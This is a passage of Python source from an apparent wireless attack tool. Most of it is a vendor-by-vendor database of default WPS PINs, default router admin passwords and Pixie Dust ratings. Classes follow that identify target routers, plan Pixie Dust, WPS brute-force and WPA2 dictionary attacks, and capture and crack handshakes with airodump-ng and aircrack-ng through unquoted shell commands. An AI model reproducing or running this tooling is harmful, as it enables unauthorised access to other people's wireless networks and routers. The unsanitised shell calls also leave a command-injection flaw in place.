            'weak_wps': True,
            'pixie_dust': True,
            'brute_force': True,
            'vulnerable': True,
            'vuln_versions': ['1.0', '1.1', '1.2']
        },
        'Asus': {
            'models': ['RT-N12', 'RT-N16', 'RT-AC51U', 'RT-AC66U', 'RT-AC82U', 'RT-AC88U', 'RT-AX88U', 'ROG Rapture GT-AC5300'],
            'default_pins': ['12345670', '88888888', '00000000'],
            'default_creds': [('admin', 'admin'), ('admin', '12345')],
            'weak_wps': True,
            'pixie_dust': False,
            'brute_force': True,
            'vuln_versions': []
        },
        'Linksys': {
            'models': ['WRT120N', 'WRT160N', 'WRT300N', 'E1000', 'E2500', 'E4200', 'MR8300', 'EA6350', 'EA7300'],
            'default_pins': ['12345670', '00000000', '11223344'],
            'default_creds': [('admin', 'admin'), ('admin', 'linksys')],
            'weak_wps': True,
            'pixie_dust': True,
            'brute_force': True,
            'vuln_versions': ['1.0', '1.1', '1.2']
        },
        'Huawei': {
            'models': ['HG8245', 'HG532e', 'B593', 'E5186', 'HG533', 'HG255'],
            'default_pins': ['00000000', '12345678', '11111111'],
            'default_creds': [('admin', 'admin'), ('telecomadmin', 'admintelecom'), ('admin', 'huawei123')],
            'weak_wps': False,
            'pixie_dust': False,
            'brute_force': True,
            'vuln_versions': []
        },
        'ZTE': {
            'models': ['ZXV10 H108N', 'ZXV10 H108L', 'ZTE F609', 'MF831', 'MF833V', 'MU2500'],
            'default_pins': ['00000000', '12345670', '12345678'],
            'default_creds': [('admin', 'admin'), ('admin', 'zte'), ('root', 'zte')],
            'weak_wps': False,
            'pixie_dust': False,
            'brute_force': True,
            'vuln_versions': []
        },
        'Tenda': {
            'models': ['N301', 'N600', 'AC6', 'AC10U', 'AC15', 'AC1200', 'AC9', 'N318'],
            'default_pins': ['00000000', '12345670', '11111111'],
            'default_creds': [('admin', 'admin'), ('admin', 'tendawifi')],
            'weak_wps': True,
            'pixie_dust': True,
            'brute_force': True,
            'vuln_versions': ['1.0', '1.1']
        },
        'MikroTik': {
            'models': ['RB433', 'RB750', 'RB951', 'RB2011', 'RB3011', 'hAP', 'hAP ac'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', ''), ('admin', 'admin'), ('root', 'root')],
            'weak_wps': True,
            'pixie_dust': False,
            'brute_force': True,
            'known_vulns': ['RouterOS default creds', 'Weak encryption']
        },
        'Buffalo': {
            'models': ['WZR-HP-G300NH', 'AirStation', 'WHR-HP-G300N', 'WZR-600DHP'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin'), ('root', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'brute_force': True,
            'vuln_versions': []
        },
        'Belkin': {
            'models': ['N600', 'AC1200', 'N150', 'N300', 'F5D8633-4'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin'), ('admin', 'belkin')],
            'weak_wps': True,
            'pixie_dust': True,
            'brute_force': True,
            'vuln_versions': ['1.0']
        },
        'Realtek': {
            'models': ['RTL8188', 'RTL8192', 'RTL8723'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'brute_force': True,
            'known_vulns': ['Software AP vulnerabilities']
        },
        'Ubiquiti': {
            'models': ['EdgeRouter', 'UniFi AP', 'EdgePoint', 'PowerBeam'],
            'default_pins': ['00000000'],
            'default_creds': [('ubnt', 'ubnt'), ('admin', 'ubnt')],
            'weak_wps': False,
            'pixie_dust': False,
            'brute_force': True,
            'known_vulns': ['Privilege escalation']
        },
        'Cisco': {
            'models': ['Linksys E2500', 'E4200', 'Catalyst 9000'],
            'default_pins': ['00000000'],
            'default_creds': [('admin', 'admin'), ('admin', 'cisco')],
            'weak_wps': False,
            'pixie_dust': False,
            'brute_force': True,
            'vuln_versions': []
        },
        'Alcatel': {
            'models': ['HH40', 'HH41', 'Link Zone'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': False,
            'brute_force': True,
            'vuln_versions': []
        },
        'ASUS ZenWiFi': {
            'models': ['AX6600', 'AX11000', 'ET12'],
            'default_pins': ['12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': False,
            'pixie_dust': False,
            'brute_force': True,
            'vuln_versions': []
        },
        'Eero': {
            'models': ['Pro', 'Pro 6', 'Beacon'],
            'default_pins': ['00000000'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': False,
            'pixie_dust': False,
            'brute_force': False,
            'known_vulns': ['Mesh network privacy']
        },
        'Google Nest': {
            'models': ['WiFi', 'WiFi Pro 6E', 'WiFi Pro 7'],
            'default_pins': ['00000000'],
            'default_creds': [],
            'weak_wps': False,
            'pixie_dust': False,
            'brute_force': False,
            'known_vulns': ['Account-based security']
        },
        'Orbi': {
            'models': ['RBK50', 'RBK850', 'RBK960'],
            'default_pins': ['00000000'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': False,
            'pixie_dust': False,
            'brute_force': True,
            'vuln_versions': []
        },
        'GL.iNet': {
            'models': ['GL-AR150', 'GL-MT300N', 'GL-X750', 'GL-AX1800'],
            'default_pins': ['00000000'],
            'default_creds': [('admin', 'admin'), ('root', 'goodlife')],
            'weak_wps': True,
            'pixie_dust': False,
            'brute_force': True,
            'known_vulns': ['Custom firmware vulnerabilities']
        },
        'Vodafone': {
            'models': ['Station', 'EasyBox', 'Power Station'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin'), ('admin', 'vodafone')],
            'weak_wps': True,
            'pixie_dust': True,
            'brute_force': True,
            'vuln_versions': ['1.0']
        },
        'BT Home Hub': {
            'models': ['2.0', '3.0', '4.0', '5.0'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin'), ('admin', 'bhpasswrd')],
            'weak_wps': True,
            'pixie_dust': True,
            'brute_force': True,
            'vuln_versions': []
        },
        'Sky Broadband': {
            'models': ['SR101', 'SR102', 'SR103'],
            'default_pins': ['00000000'],
            'default_creds': [('admin', 'admin'), ('admin', 'sky')],
            'weak_wps': True,
            'pixie_dust': True,
            'brute_force': True,
            'vuln_versions': []
        },
        'Virgin Media': {
            'models': ['Hub 3', 'Hub 4', 'Hub 5'],
            'default_pins': ['00000000'],
            'default_creds': [('admin', 'virgin'), ('admin', 'admin')],
            'weak_wps': False,
            'pixie_dust': False,
            'brute_force': True,
            'vuln_versions': []
        },
        'BrosTrend': {
            'models': ['Reuter', 'AC1200', 'AC1900'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'brute_force': True,
            'vuln_versions': []
        },
        'Mercusys': {
            'models': ['MW300', 'MW325', 'MR30G', 'MR50G'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'brute_force': True,
            'vuln_versions': []
        },
        'Tp-Link Deco': {
            'models': ['M5', 'M9 Plus', 'X60', 'X90'],
            'default_pins': ['12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': False,
            'pixie_dust': False,
            'brute_force': True,
            'known_vulns': ['Mesh configuration bypass']
        },
        'Arris': {
            'models': ['SB6141', 'SB8200', 'SB6190'],
            'default_pins': ['00000000'],
            'default_creds': [('admin', 'motorola')],
            'weak_wps': False,
            'pixie_dust': False,
            'brute_force': True,
            'known_vulns': ['ISP-controlled modem vulnerabilities']
        },

        'MediaTek MT7620': {
            'models': ['WITI Board', 'VDSL Modem', 'ISP Router MT7620', 'Wireless CPE MT7620'],
            'default_pins': ['00000000', '12345670', '11111111', '99999999'],
            'default_creds': [('admin', 'admin'), ('admin', ''), ('root', 'root')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'CRITICAL',
            'brute_force': True,
            'known_vulns': ['MediaTek chipset known vulnerability', 'WPS implementation flaw']
        },
        'MediaTek MT7628': {
            'models': ['IoT Router MT7628', 'WiFi Repeater MT7628', 'Budget Router MT7628'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'CRITICAL',
            'brute_force': True,
            'known_vulns': ['MediaTek WPS flaw']
        },
        'Realtek RTL8188EUS': {
            'models': ['USB WiFi RTL8188', 'Pocket WiFi RTL8188', 'Travel Router RTL8188'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'HIGH',
            'brute_force': True,
            'known_vulns': ['RealTek firmware vulnerability']
        },
        'Qualcomm QCA9377': {
            'models': ['QSDK Router QCA9377', 'Enterprise AP QCA9377'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'HIGH',
            'brute_force': True,
            'known_vulns': ['QSDK WPS vulnerability']
        },
        'MiBox/Xiaomi': {
            'models': ['MiBoot Router', 'Xiaomi Mi WiFi 2', 'Xiaomi Mi WiFi 3'],
            'default_pins': ['12345670', '11111111', '00000000'],
            'default_creds': [('admin', 'admin'), ('root', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'CRITICAL',
            'brute_force': True,
            'known_vulns': ['OpenWrt base vulnerabilities', 'Weak WPS']
        },
        'Nexx WT3020': {
            'models': ['Nexx WT3020', 'WT3020F', 'WT3020AD'],
            'default_pins': ['12345670', '00000000'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'HIGH',
            'brute_force': True,
            'known_vulns': ['OpenWrt vulnerabilities']
        },
        'Broadcom BCM4330': {
            'models': ['WiFi Module BCM4330', 'Consumer Router BCM4330'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'MEDIUM-HIGH',
            'brute_force': True,
            'known_vulns': ['Broadcom WPS flaw']
        },
        'Broadcom BCM4360': {
            'models': ['WiFi Module BCM4360', 'Enterprise BCM4360'],
            'default_pins': ['12345670', '00000000'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'MEDIUM',
            'brute_force': True,
            'known_vulns': ['Broadcom vulnerability']
        },
        'Atheros AR9331': {
            'models': ['AR9331 Router', 'Dragino AR9331', 'OpenWrt AR9331'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin'), ('root', 'root')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'CRITICAL',
            'brute_force': True,
            'known_vulns': ['OpenWrt vulnerabilities']
        },
        'MIPS 24Kc-based': {
            'models': ['MIPS Router', 'Budget MIPS Router', 'Asian MIPS Router'],
            'default_pins': ['00000000', '12345670', '99999999'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'CRITICAL',
            'brute_force': True,
            'known_vulns': ['Legacy MIPS implementation flaws']
        },
        'Ralink RT3050': {
            'models': ['RT3050 WiFi', 'Budget Ralink RT3050', 'ISP Ralink RT3050'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'CRITICAL',
            'brute_force': True,
            'known_vulns': ['Ralink firmware vulnerability']
        },
        'Ralink RT5350': {
            'models': ['RT5350 Router', 'Ralink RT5350'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'CRITICAL',
            'brute_force': True,
            'known_vulns': ['Ralink WPS implementation flaw']
        },
        'JCG (budget China)': {
            'models': ['JCG Y2', 'JCG Q20', 'JCG A6'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin'), ('admin', 'jcg')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'CRITICAL',
            'brute_force': True,
            'known_vulns': ['Poor WPS implementation']
        },
        'Tomato Firmware': {
            'models': ['Asus RT-N66U Tomato', 'Custom Tomato Router', 'Tomato-based'],
            'default_pins': ['12345670', '00000000'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'MEDIUM',
            'brute_force': True,
            'known_vulns': ['Tomato firmware vulnerabilities']
        },
        'OpenWrt Generic': {
            'models': ['OpenWrt TP-Link', 'OpenWrt D-Link', 'OpenWrt Linksys'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin'), ('root', 'root')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'HIGH',
            'brute_force': True,
            'known_vulns': ['OpenWrt base vulnerabilities']
        },
        'Gargoyle Router': {
            'models': ['Gargoyle OpenWrt', 'Custom Gargoyle'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'MEDIUM',
            'brute_force': True,
            'known_vulns': ['Gargoyle vulnerabilities']
        },
        'FritzBox (older)': {
            'models': ['FritzBox 3370', 'FritzBox 3390', 'FritzBox 3490'],
            'default_pins': ['00000000'],
            'default_creds': [('admin', ''), ('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'MEDIUM',
            'brute_force': True,
            'known_vulns': ['FritzBox firmware vulnerabilities']
        },
        'Zyxel NBG': {
            'models': ['Zyxel NBG7515', 'NBG6827', 'NBG5412'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', '1234'), ('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'MEDIUM',
            'brute_force': True,
            'known_vulns': ['Zyxel WPS weakness']
        },
        'Synology RT': {
            'models': ['Synology RT1900ac', 'RT2600ac'],
            'default_pins': ['00000000'],
            'default_creds': [('admin', 'synology')],
            'weak_wps': False,
            'pixie_dust': False,
            'brute_force': True,
            'known_vulns': []
        },
        'Ubiquiti EdgeRouter X': {
            'models': ['EdgeRouter X', 'ER-X'],
            'default_pins': ['00000000'],
            'default_creds': [('ubnt', 'ubnt')],
            'weak_wps': False,
            'pixie_dust': False,
            'brute_force': True,
            'known_vulns': ['No WPS support']
        },
        'Turbo WiFi': {
            'models': ['TurboBox', 'Turbo T3', 'Turbo Pro'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'CRITICAL',
            'brute_force': True,
            'known_vulns': ['Poor security implementation']
        },
        'Comtrend': {
            'models': ['Comtrend 5067', 'Comtrend 5071'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'MEDIUM',
            'brute_force': True,
            'known_vulns': ['ISP modem vulnerabilities']
        },
        'Totolink': {
            'models': ['Totolink N300RH', 'N600R', 'AC1200R'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'HIGH',
            'brute_force': True,
            'known_vulns': ['Weak WPS implementation']
        },
        'Wavlink': {
            'models': ['Wavlink WL-WN531G3', 'WL-WN576K2', 'WL-WN531A2'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'HIGH',
            'brute_force': True,
            'known_vulns': ['Poor WPS security']
        },
        'Planex': {
            'models': ['Planex DB-WRT300N', 'MZK-750DHP'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'MEDIUM-HIGH',
            'brute_force': True,
            'known_vulns': ['Planex firmware flaws']
        },
        'IOGear': {
            'models': ['IOGear GWU625', 'GWU626', 'GXWU625'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'MEDIUM',
            'brute_force': True,
            'known_vulns': []
        },
        'Airlink': {
            'models': ['Airlink101 AR430W', 'AR450W'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'MEDIUM',
            'brute_force': True,
            'known_vulns': []
        },
        'Edimax': {
            'models': ['Edimax BR-6428nS', 'BR-6675nD', 'BR-6258n'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'MEDIUM',
            'brute_force': True,
            'known_vulns': ['Weak WPS']
        },
        'Amped Wireless': {
            'models': ['Amped ATHENA-EX', 'ALLY', 'COPTER'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'MEDIUM',
            'brute_force': True,
            'known_vulns': []
        },
        'Sitecom': {
            'models': ['Sitecom WLR-6100', 'WLR-7100'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'MEDIUM',
            'brute_force': True,
            'known_vulns': ['Weak WPS implementation']
        },
        'Netis': {
            'models': ['Netis WF2780', 'WF2883', 'MW5230'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'HIGH',
            'brute_force': True,
            'known_vulns': ['Poor security design']
        },
        'Coship': {
            'models': ['Coship LTE Router', 'VDSL Modem'],
            'default_pins': ['00000000', '12345670'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'HIGH',
            'brute_force': True,
            'known_vulns': ['ISP modem vulnerabilities']
        },
        'Zotac': {
            'models': ['Zotac ZBOX Nano'],
            'default_pins': ['00000000'],
            'default_creds': [('admin', 'admin')],
            'weak_wps': True,
            'pixie_dust': True,
            'pixie_dust_rating': 'MEDIUM',
            'brute_force': True,
            'known_vulns': []
        }
    }

    def __init__(self):
        self.detected_model = None
        self.detected_vendor = None

    def detect_router(self, bssid, essid, device_name):
        """Detect router model from BSSID/ESSID/device name"""
        for vendor, info in self.MODELS.items():
            for model in info['models']:
                if model.lower() in essid.lower() or model.lower() in device_name.lower():
                    self.detected_vendor = vendor
                    self.detected_model = model
                    return vendor, model
        return None, None

    def get_default_pins(self, vendor):
        """Get default WPS PINs for vendor"""
        if vendor in self.MODELS:
            return self.MODELS[vendor].get('default_pins', [])
        return []

    def get_default_credentials(self, vendor):
        """Get default credentials for vendor"""
        if vendor in self.MODELS:
            return self.MODELS[vendor].get('default_creds', [])
        return []

    def is_pixie_vulnerable(self, vendor):
        """Check if vendor/model is vulnerable to Pixie Dust"""
        if vendor in self.MODELS:
            return self.MODELS[vendor].get('pixie_dust', False)
        return False

    def get_vulnerabilities(self, vendor):
        """Get known vulnerabilities for vendor"""
        if vendor in self.MODELS:
            model_info = self.MODELS[vendor]
            vulns = []
            if model_info.get('weak_wps'):
                vulns.append('Weak WPS implementation')
            if model_info.get('pixie_dust'):
                vulns.append('Pixie Dust vulnerability')
            if model_info.get('vulnerable'):
                vulns.append('Critical WPS vulnerability')
            return vulns
        return []

    def get_pixie_dust_routers(self):
        """Get all routers vulnerable to Pixie Dust attack"""
        pixie_routers = {}
        for vendor, info in self.MODELS.items():
            if info.get('pixie_dust', False):
                pixie_routers[vendor] = info
        return pixie_routers

    def get_pixie_dust_by_rating(self, rating='CRITICAL'):
        """Get Pixie Dust routers by severity rating"""
        rated_routers = {}
        for vendor, info in self.MODELS.items():
            if info.get('pixie_dust', False):
                if info.get('pixie_dust_rating', 'MEDIUM') == rating:
                    rated_routers[vendor] = info
        return rated_routers

    def get_all_pixie_dust_ratings(self):
        """Get summary of all Pixie Dust ratings"""
        ratings = {
            'CRITICAL': 0,
            'HIGH': 0,
            'MEDIUM-HIGH': 0,
            'MEDIUM': 0,
            'LOW': 0
        }
        for vendor, info in self.MODELS.items():
            if info.get('pixie_dust', False):
                rating = info.get('pixie_dust_rating', 'MEDIUM')
                if rating in ratings:
                    ratings[rating] += 1
        return ratings

    def is_pixie_dust_vulnerable(self, vendor):
        """Check if vendor is vulnerable to Pixie Dust"""
        if vendor in self.MODELS:
            return self.MODELS[vendor].get('pixie_dust', False)
        return False

    def get_pixie_dust_rating(self, vendor):
        """Get Pixie Dust vulnerability rating for vendor"""
        if vendor in self.MODELS:
            return self.MODELS[vendor].get('pixie_dust_rating', 'UNKNOWN')
        return 'UNKNOWN'

    def list_all_models(self):
        """List all known vulnerable router models"""
        for vendor, info in self.MODELS.items():
            vulns = self.get_vulnerabilities(vendor)
            pixie_status = f" {red}[PIXIE DUST]{reset}" if info.get('pixie_dust') else ""
            pixie_rating = info.get('pixie_dust_rating', '')
            if pixie_rating:
                pixie_status += f" ({yellow}{pixie_rating}{reset})"
            print(f"{green}{vendor}:{reset}{pixie_status}")
            for model in info['models']:
                vuln_str = ', '.join(vulns) if vulns else 'Limited vulnerabilities'
                print(f"  - {model}: {vuln_str}")
            print()

    def list_pixie_dust_routers(self):
        """List only Pixie Dust vulnerable routers with detailed info"""
        pixie_routers = self.get_pixie_dust_routers()
        ratings_summary = self.get_all_pixie_dust_ratings()

        print(f"\n{yellow}{'='*70}{reset}")
        print(f"{red}PIXIE DUST VULNERABLE ROUTERS - COMPREHENSIVE DATABASE{reset}")
        print(f"{yellow}{'='*70}{reset}")
        print(f"\nTotal Pixie Dust Vulnerable Vendors: {len(pixie_routers)}")
        print(f"Vulnerability Breakdown:")
        print(f"  {red}CRITICAL: {ratings_summary['CRITICAL']}{reset}")
        print(f"  {yellow}HIGH: {ratings_summary['HIGH']}{reset}")
        print(f"  {cyan}MEDIUM-HIGH: {ratings_summary['MEDIUM-HIGH']}{reset}")
        print(f"  {green}MEDIUM: {ratings_summary['MEDIUM']}{reset}")

        print(f"\n{yellow}Detailed Listing:{reset}\n")

        for rating in ['CRITICAL', 'HIGH', 'MEDIUM-HIGH', 'MEDIUM']:
            routers_by_rating = self.get_pixie_dust_by_rating(rating)
            if routers_by_rating:
                color_rating = red if rating == 'CRITICAL' else yellow if rating == 'HIGH' else cyan
                print(f"{color_rating}[{rating}]{reset} ({len(routers_by_rating)} vendors)")
                for vendor, info in routers_by_rating.items():
                    print(f"  {green}→ {vendor}{reset}")
                    for model in info['models']:
                        print(f"      • {model}")
                    if info.get('known_vulns'):
                        print(f"      Vulnerabilities: {', '.join(info['known_vulns'])}")
                print()

        print(f"{yellow}{'='*70}{reset}\n")

class UnifiedRouterPentest:
    """Unified framework for testing all vulnerable router types"""

    def __init__(self, interface, aggressive_mode=False):
        self.interface = interface
        self.aggressive_mode = aggressive_mode
        self.router_db = RouterModels()
        self.exploitation_results = []
        self.timeout_multiplier = 2 if aggressive_mode else 1

    def scan_and_identify_vulnerabilities(self, bssid, essid, device_name, security_type):
        """Scan target and identify all  possible vulnerabilities"""
        vulnerabilities = []
        vendor, model = self.router_db.detect_router(bssid, essid, device_name)

        print(f"\n{info} Scanning {essid} ({bssid}) for vulnerabilities...")

        if vendor:
            print(f"{ok} Router identified: {vendor} {model}")
            vulns = self.router_db.get_vulnerabilities(vendor)
            if vulns:
                for vuln in vulns:
                    vulnerabilities.append({
                        'type': vuln,
                        'vendor': vendor,
                        'exploitable': True
                    })
                print(f"{ok} Known vulnerabilities: {', '.join(vulns)}")

        if security_type == 'Open':
            vulnerabilities.append({
                'type': 'Open Network',
                'vendor': 'Generic',
                'exploitable': True
            })
            print(f"{ok} Network is OPEN (no WPA/WPA2)")

        if 'WPA' in security_type:
            vulnerabilities.append({
                'type': 'WPA/WPA2 Network',
                'vendor': 'Generic',
                'exploitable': True
            })

        return vulnerabilities, vendor

    def generate_attack_plan(self, vulnerabilities, vendor, bssid, essid):
        """Generate optimized attack plan based on detected vulnerabilities"""
        attack_plan = {
            'primary_attacks': [],
            'secondary_attacks': [],
            'tools_needed': set(),
            'estimated_time': 0
        }

        for vuln in vulnerabilities:
            if 'Pixie Dust' in vuln['type']:
                attack_plan['primary_attacks'].append({
                    'name': 'Pixie Dust Attack',
                    'tool': 'pixiewps',
                    'time_estimate': 5,
                    'success_rate': 'High'
                })
                attack_plan['tools_needed'].add('pixiewps')

            if 'Weak WPS' in vuln['type']:
                attack_plan['primary_attacks'].append({
                    'name': 'WPS PIN Brute Force',
                    'tool': 'wpa_supplicant',
                    'time_estimate': 15,
                    'success_rate': 'Very High'
                })
                attack_plan['tools_needed'].add('wpa_supplicant')

            if 'WPA' in vuln['type']:
                attack_plan['secondary_attacks'].append({
                    'name': 'WPA2 Dictionary Attack',
                    'tool': 'aircrack-ng',
                    'time_estimate': 120,
                    'success_rate': 'Medium'
                })
                attack_plan['tools_needed'].add('aircrack-ng')

        if not attack_plan['primary_attacks']:
            attack_plan['primary_attacks'].append({
                'name': 'Default Credentials/PIN Attempt',
                'tool': 'wpa_supplicant',
                'time_estimate': 10,
                'success_rate': 'Medium'
            })

        return attack_plan

    def display_exploitation_summary(self, bssid, essid, vendor, vulns, attack_plan):
        """Display comprehensive exploitation summary"""
        print(f"\n{green}{'='*60}{reset}")
        print(f"{yellow}EXPLOITATION SUMMARY{reset}")
        print(f"{green}{'='*60}{reset}")
        print(f"{info} Target: {yellow}{essid}{reset} ({bssid})")
        print(f"{info} Vendor: {yellow}{vendor or 'Unknown'}{reset}")
        print(f"{info} Vulnerabilities Found: {len(vulns)}")
        for i, vuln in enumerate(vulns, 1):
            print(f"  {i}. {green}{vuln['type']}{reset}")

        print(f"\n{info} Attack Plan:")
        for i, attack in enumerate(attack_plan['primary_attacks'], 1):
            print(f"  {green}PRIMARY{reset} {i}. {attack['name']} ({attack['success_rate']} success)")
            print(f"       Estimated time: {attack['time_estimate']}s | Tool: {attack['tool']}")

        for i, attack in enumerate(attack_plan['secondary_attacks'], 1):
            print(f"  {yellow}SECONDARY{reset} {i}. {attack['name']} ({attack['success_rate']} success)")
            print(f"       Estimated time: {attack['time_estimate']}s | Tool: {attack['tool']}")

        print(f"{info} Tools Needed: {', '.join(attack_plan['tools_needed'])}")
        print(f"{green}{'='*60}{reset}\n")

    def get_device_pins(self, vendor, bssid, essid):
        """Get all possible PINs for a device"""
        pins = []

        default_pins = self.router_db.get_default_pins(vendor) if vendor else []
        pins.extend(default_pins)

        advanced_pins = AdvancedPINAlgorithms.generate_intelligent_pins(bssid, vendor, essid)
        pins.extend(advanced_pins)

        seen = set()
        unique_pins = []
        for pin in pins:
            if pin not in seen:
                unique_pins.append(pin)
                seen.add(pin)

        return unique_pins

    def attempt_default_credentials(self, vendor):
        """Try default credentials for the vendor"""
        if not vendor:
            return None

        creds = self.router_db.get_default_credentials(vendor)
        for username, password in creds:
            print(f"{info} Trying credentials: {username}:{password}")

        return creds

    def pentest_router(self, bssid, essid, device_name='', security_type='WPA2'):
        """Main pentest routine for a single router"""
        print(f"\n{yellow}{'='*60}{reset}")
        print(f"{yellow}STARTING UNIFIED PENTEST{reset}")
        print(f"{yellow}{'='*60}{reset}")

        vulns, vendor = self.scan_and_identify_vulnerabilities(bssid, essid, device_name, security_type)

        if not vulns:
            print(f"{err} No known vulnerabilities detected for this router")
            return None

        attack_plan = self.generate_attack_plan(vulns, vendor, bssid, essid)

        self.display_exploitation_summary(bssid, essid, vendor, vulns, attack_plan)

        pins = self.get_device_pins(vendor, bssid, essid)
        print(f"{info} Generated {len(pins)} candidate PINs")
        print(f"{info} Top 5 PINs to try: {', '.join(pins[:5])}")

        if vendor:
            creds = self.attempt_default_credentials(vendor)
            if creds:
                print(f"{info} {len(creds)} default credential sets available")

        return {
            'bssid': bssid,
            'essid': essid,
            'vendor': vendor,
            'vulnerabilities': vulns,
            'attack_plan': attack_plan,
            'pins': pins,
            'status': 'ready_for_exploitation'
        }

class WPA2Cracker:
    """WPA2 password cracking via dictionary attack and PMKID"""

    def __init__(self, interface, target_bssid, target_ssid):
        self.interface = interface
        self.bssid = target_bssid
        self.ssid = target_ssid
        self.handshake_file = None
        self.pmkid_file = None
        self.cracked = False
        self.password = None

    def capture_handshake(self, timeout=60):
        """Capture WPA2 4-way handshake"""
        print(f"{info} Attempting to capture WPA2 handshake (timeout: {timeout}s)...")

        cmd = f"timeout {timeout} airodump-ng -c 6 --bssid {self.bssid} -w /tmp/handshake {self.interface}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        if os.path.exists('/tmp/handshake-01.cap'):
            self.handshake_file = '/tmp/handshake-01.cap'
            print(f"{ok} Handshake captured: {self.handshake_file}")
            return True
        print(f"{err} Failed to capture handshake")
        return False

    def crack_with_wordlist(self, wordlist_file, output_file=None):
        """Crack WPA2 using dictionary attack"""
        if not self.handshake_file:
            print(f"{warn} No handshake file available. Capture handshake first.")
            return False

        if not os.path.exists(wordlist_file):
            print(f"{err} Wordlist file not found: {wordlist_file}")
            return False

        print(f"{info} Starting WPA2 dictionary attack...")
        print(f"{info} Wordlist: {wordlist_file}")

        cmd = f"aircrack-ng -w {wordlist_file} {self.handshake_file}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        if 'KEY FOUND' in result.stdout:
            lines = result.stdout.split('\n')
            for line in lines:
                if 'KEY FOUND' in line:
                    self.password = line.split('[')[-1].split(']')[0]
                    self.cracked = True
